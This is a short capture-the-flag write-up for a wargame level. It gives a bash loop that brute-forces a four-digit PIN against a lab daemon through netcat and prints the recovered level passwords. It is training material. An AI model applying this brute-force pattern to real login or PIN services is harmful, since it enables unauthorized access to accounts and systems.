## Level Goal ##

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution ##

We know from the level goal that we are supposed to brute force the passcode to obtain the password. We can write a simple bash script to iterate through 0-9999 and feed each number into the netcat connection.

Example:
```
#!/bin/bash
for i in range {0..9999}                                         
do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
done | nc localhost 30002 > /tmp/nc_out
```

When this script is done executing, we can retrive the password from '/tmp/nc_out' of uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG.
